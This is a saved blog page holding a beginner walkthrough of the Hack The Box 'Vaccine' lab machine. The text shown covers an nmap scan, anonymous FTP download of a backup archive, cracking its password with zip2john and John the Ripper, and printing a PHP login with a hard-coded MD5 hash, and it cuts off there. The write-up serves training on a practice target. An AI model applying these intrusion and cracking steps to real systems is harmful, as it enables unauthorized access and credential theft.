<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Vaccine - Walkthrough | Ee-Vah?</title><meta name=keywords content="htb,walkthrough,vaccine,tier-2,free-tier,web,network,vulnerability-assessment,databases,injection,custom-applications,protocols,source-code-analysis,apache,postgresql,ftp,php,reconnaissance,password-cracking,sudo-exploitation,sql-injection,remote-code-execution,clear-text-credentials,anonymous-access,guest-access,linux-target,easy-box,user-own,system-own"><meta name=description content="The aim of this walkthrough is to provide help with the Vaccine machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta name=author content="bluewalle"><link rel=canonical href=https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/vaccine/><meta name=google-site-verification content="XYZabc"><meta name=yandex-verification content="XYZabc"><meta name=msvalidate.01 content="XYZabc"><link crossorigin=anonymous href=/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe+FVUFzPh7U=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://bluewalle.github.io/main/img/48x48.svg><link rel=icon type=image/png sizes=16x16 href=https://bluewalle.github.io/main/img/16x16_white.svg><link rel=icon type=image/png sizes=32x32 href=https://bluewalle.github.io/main/img/32x32_white.svg><link rel=apple-touch-icon href=https://bluewalle.github.io/main/img/180x180_white.svg><link rel=mask-icon href=https://bluewalle.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="HTB - Vaccine - Walkthrough"><meta property="og:description" content="The aim of this walkthrough is to provide help with the Vaccine machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><meta property="og:type" content="article"><meta property="og:url" content="https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/vaccine/"><meta property="og:image" content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-05-18T00:00:00+00:00"><meta property="article:modified_time" content="2023-05-18T00:00:00+00:00"><meta property="og:site_name" content="Just Keep Swimming"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://bluewalle.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HTB - Vaccine - Walkthrough"><meta name=twitter:description content="The aim of this walkthrough is to provide help with the Vaccine machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.
It belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.
SETUP There are a couple of ways to connect to the target machine."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://bluewalle.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Vaccine - Walkthrough","item":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/vaccine/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Vaccine - Walkthrough","name":"HTB - Vaccine - Walkthrough","description":"The aim of this walkthrough is to provide help with the Vaccine machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine.","keywords":["htb","walkthrough","vaccine","tier-2","free-tier","web","network","vulnerability-assessment","databases","injection","custom-applications","protocols","source-code-analysis","apache","postgresql","ftp","php","reconnaissance","password-cracking","sudo-exploitation","sql-injection","remote-code-execution","clear-text-credentials","anonymous-access","guest-access","linux-target","easy-box","user-own","system-own"],"articleBody":"The aim of this walkthrough is to provide help with the Vaccine machine on the Hack The Box website. Please note that no flags are directly provided here. Moreover, be aware that this is only one of the many ways to solve the challenges.\nIt belongs to a series of tutorials that aim to help out complete beginners with finishing the Starting Point TIER 2 challenges.\nSETUP There are a couple of ways to connect to the target machine. The one we will be using throughout this walkthrough is via the provided pwnbox.\nOnce our connection is taken care of, we spawn the target machine.\nAdditionally - even though not required - it is possible to set a local variable (only available in the current shell) containing our target host’s IP address. Once set, we can easily access it by prepending a $ to our variable name.\n┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $rhost= ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ echo $rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ We could use the unset command to remove it after we no longer need it.\n┌─[✗]─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $unset rhost ┌─[htb-bluewalle@htb-pwdysfiide]─[~/Desktop] └──╼ $ TASK 1 Question: Besides SSH and HTTP, what other service is hosted on this box?\nWe start out with a quick connection check\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ ping $rhost -c 4 PING 10.129.94.247 (10.129.94.247) 56(84) bytes of data. 64 bytes from 10.129.94.247: icmp_seq=1 ttl=63 time=10.8 ms 64 bytes from 10.129.94.247: icmp_seq=2 ttl=63 time=10.5 ms 64 bytes from 10.129.94.247: icmp_seq=3 ttl=63 time=10.2 ms 64 bytes from 10.129.94.247: icmp_seq=4 ttl=63 time=10.2 ms --- 10.129.94.247 ping statistics --- 4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 10.202/10.435/10.777/0.232 ms ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ and follow up on it with the usual (version and script - top 1000 ports) nmap scan.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ nmap -sC -sV $rhost Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-18 03:15 BST Nmap scan report for 10.129.94.247 Host is up (0.069s latency). Not shown: 997 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.10.14.12 | Logged in as ftpuser | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 4 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rwxr-xr-x 1 0 0 2533 Apr 13 2021 backup.zip 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0ee58077534b00b9165b259569527a4 (RSA) | 256 ac6e81188922d7a7417d814f1bb8b251 (ECDSA) |_ 256 425bc321dfefa20bc95e03421d69d028 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-title: MegaCorp Login |_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.30 seconds ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ Couple of things that may stand out at first look:\nftp anonymous/guest login is allowed there is a file backup.zip which we can access via ftp ssh version is 1:8.0p1-6ubuntu0.1 apache webserver is running with version ‘Apache httpd 2.4.41’ running os is probably Ubuntu 19.10 - Eoan Ermine We continue with a quick fingerprinting.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ whatweb $rhost http://10.129.94.247 [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.94.247], PasswordField[password], Title[MegaCorp Login] ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ ftp\nTASK 2 Question: This service can be configured to allow login with any password for specific username. What is that username?\nSince anonymous login is enabled on the ftp server, we check it out and proceed downloading the file we spotted earlier (in TASK1).\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ ftp $rhost Connected to 10.129.94.247. 220 (vsFTPd 3.0.3) Name (10.129.94.247:root): anonymous 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rwxr-xr-x 1 0 0 2533 Apr 13 2021 backup.zip 226 Directory send OK. ftp\u003e get backup.zip local: backup.zip remote: backup.zip 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for backup.zip (2533 bytes). 226 Transfer complete. 2533 bytes received in 0.00 secs (1.6289 MB/s) ftp\u003e exit 221 Goodbye. ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ anonymous\nTASK 3 Question: What is the name of the file downloaded over this service?\nSimply trying to decompress it does not work as it is password protected.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ ll total 4.0K -rw-r--r-- 1 htb-bluewalle htb-bluewalle 2.5K May 18 03:17 backup.zip ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ unzip backup.zip Archive: backup.zip [backup.zip] index.php password: password incorrect--reenter: password incorrect--reenter: skipping: index.php incorrect password [backup.zip] style.css password: password incorrect--reenter: password incorrect--reenter: skipping: style.css incorrect password ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ backup.zip\nTASK 4 Question: What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?\nA quick online search leaves us with two potential candidates:\nzip2john rar2john But given the extension of backup.zip, it should be the first one. Now that we identified the necessary tools, we get to it.\nFirst we create the password hash which we can later crack.\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ man john ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ zip2john backup.zip \u003e backupzip.hash Created directory: /home/htb-bluewalle/.john ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A NOTE: It is assumed that all files in each archive have the same password. If that is not the case, the hash may be uncrackable. To avoid this, use option -o to pick a file at a time. ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ ll total 8.0K -rw-r--r-- 1 htb-bluewalle htb-bluewalle 2.5K May 18 03:17 backup.zip -rw-r--r-- 1 htb-bluewalle htb-bluewalle 2.2K May 18 03:20 backupzip.hash ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ This is how the resulting password hash looks like:\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ cat backupzip.hash backup.zip:$pkzip2$2*2*1*0*8*24*3a41*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*1b1c*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip2$::backup.zip:style.css, index.php:backup.zip ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ So now it’s time to finally get cracking\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ john backupzip.hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 4 OpenMP threads Proceeding with single, rules:Single Press 'q' or Ctrl-C to abort, almost any other key for status Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance. Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance. Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist 741852963 (backup.zip) 1g 0:00:00:00 DONE 2/3 (2023-05-18 03:21) 11.11g/s 844766p/s 844766c/s 844766C/s 123456..ferrises Use the \"--show\" option to display all of the cracked passwords reliably Session completed ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ john --show backupzip.hash backup.zip:741852963::backup.zip:style.css, index.php:backup.zip 1 password hash cracked, 0 left ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ Unzipping the backup.zip file with the password we just found - 741852963 - will provide us with two source files:\nindex.php style.css ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ unzip backup.zip Archive: backup.zip [backup.zip] index.php password: inflating: index.php inflating: style.css ┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ Let’s check them out.\n- index.php -\n┌─[eu-starting-point-vip-1-dhcp]─[10.10.14.12]─[htb-bluewalle@htb-bigt2wisms]─[~/vaccine] └──╼ [★]$ cat index.php \u003c!DOCTYPE html\u003e \u003c?php session_start(); if(isset($_POST['username']) \u0026\u0026 isset($_POST['password'])) { if($_POST['username'] === 'admin' \u0026\u0026 md5($_POST['password']) === \"2cb42f8734ea607eefed3b70af13bbd3\") { $_SESSION['login'] = \"true\"; header(\"Location: dashboard.php\"); } } ?\u003e ","wordCount":"4273","inLanguage":"en","datePublished":"2023-05-18T00:00:00Z","dateModified":"2023-05-18T00:00:00Z","author":{"@type":"Person","name":"bluewalle"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://bluewalle.github.io/posts/walkthroughs/htb/starting-point/tier_2/vaccine/"},"publisher":{"@type":"Organization","name":"Ee-Vah?","logo":{"@type":"ImageObject","url":"https://bluewalle.github.io/main/img/48x48.svg"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://bluewalle.github.io/ accesskey=h title="Just Keep Swimming (Alt + H)"><img src=https://bluewalle.github.io/180x180_white.svg alt aria-label=logo height=35>Just Keep Swimming</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://bluewalle.github.io/posts/ title=posts><span>posts</span></a></li><li><a href=https://bluewalle.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://bluewalle.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://bluewalle.github.io/about title=about><span>about</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://bluewalle.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://bluewalle.github.io/posts/>Posts</a></div><h1 class=post-title>HTB - Vaccine - Walkthrough</h1><div class=post-meta><span title='2023-05-18 00:00:00 +0000 +0000'>May, 2023</span>&nbsp;·&nbsp;21 min&nbsp;·&nbsp;4273 words&nbsp;·&nbsp;bluewalle</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#setup><strong>SETUP</strong></a></li><li><a href=#task-1><strong>TASK 1</strong></a></li><li><a href=#task-2><strong>TASK 2</strong></a></li><li><a href=#task-3><strong>TASK 3</strong></a></li><li><a href=#task-4><strong>TASK 4</strong></a></li><li><a href=#task-5><strong>TASK 5</strong></a></li><li><a href=#task-6><strong>TASK 6</strong></a></li><li><a href=#task-7><strong>TASK 7</strong></a></li><li><a href=#submit-flag><strong>SUBMIT FLAG</strong></a></li><li><a href=#submit-flag-1><strong>SUBMIT FLAG</strong></a></li></ul></nav></div></details></div><div class=post-content><p>The aim of this walkthrough is to provide help with the <strong>Vaccine</strong> machine on the <a href=https://hackthebox.com title="Hack The Box website">Hack The Box website</a>. Please <strong>note</strong> that no <strong>flags</strong> are directly provided here. Moreover, <strong>be aware</strong> that this is only <strong>one</strong> of the <strong>many</strong> ways to solve the challenges.</p><p>It belongs to a series of tutorials that aim to help out complete beginners with finishing the <a href=https://app.hackthebox.com/starting-point title="HTB Starting Point">Starting Point</a> <strong>TIER 2</strong> challenges.</p><h2 id=setup><strong>SETUP</strong><a hidden class=anchor aria-hidden=true href=#setup>#</a></h2><p>There are a couple of ways to <strong>connect</strong> to the <strong>target machine</strong>. The one we will be using <strong>throughout</strong> this <strong>walkthrough</strong> is via the provided <strong>pwnbox</strong>.</p><p>Once our <strong>connection</strong> is taken care of, we <strong>spawn</strong> the <strong>target</strong> <strong>machine</strong>.</p><p>Additionally - even though not required - it is possible to set a <strong>local</strong> variable (only available in the current <strong>shell</strong>) containing our <strong>target host&rsquo;s</strong> IP address. Once set, we can easily <strong>access</strong> it by prepending a <em>$</em> to our variable name.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$rhost</span><span class=o>=</span>&lt;target-hosts-ip&gt;
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $ <span class=nb>echo</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>&lt;target-hosts-ip&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>We could use the <em><strong>unset</strong></em> command to remove it after we no longer need it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$unset</span> rhost 
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-pwdysfiide<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>Besides SSH and HTTP, what other service is hosted on this box?</em></p><p>We start out with a quick <em><strong>connection check</strong></em></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ping <span class=nv>$rhost</span> -c <span class=m>4</span>
</span></span><span class=line><span class=cl>PING 10.129.94.247 <span class=o>(</span>10.129.94.247<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.94.247: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.8 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.94.247: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>2</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.5 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.94.247: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>3</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.2 ms
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.129.94.247: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>4</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>10.2 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.129.94.247 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>4</span> packets transmitted, <span class=m>4</span> received, 0% packet loss, <span class=nb>time</span> 3005ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 10.202/10.435/10.777/0.232 ms
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><p>and follow up on it with the usual (version and script - top 1000 ports) <em><strong>nmap</strong></em> scan.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.12<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-bigt2wisms<span class=o>]</span>─<span class=o>[</span>~/vaccine<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nmap -sC -sV <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-18 03:15 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.94.247
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.069s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>997</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>21/tcp open  ftp     vsftpd 3.0.3
</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst: 
</span></span><span class=line><span class=cl><span class=p>|</span>   STAT: 
</span></span><span class=line><span class=cl><span class=p>|</span> FTP server status:
</span></span><span class=line><span class=cl><span class=p>|</span>      Connected to ::ffff:10.10.14.12
</span></span><span class=line><span class=cl><span class=p>|</span>      Logged in as ftpuser
</span></span><span class=line><span class=cl><span class=p>|</span>      TYPE: ASCII
</span></span><span class=line><span class=cl><span class=p>|</span>      No session bandwidth limit
</span></span><span class=line><span class=cl><span class=p>|</span>      Session timeout in seconds is <span class=m>300</span>
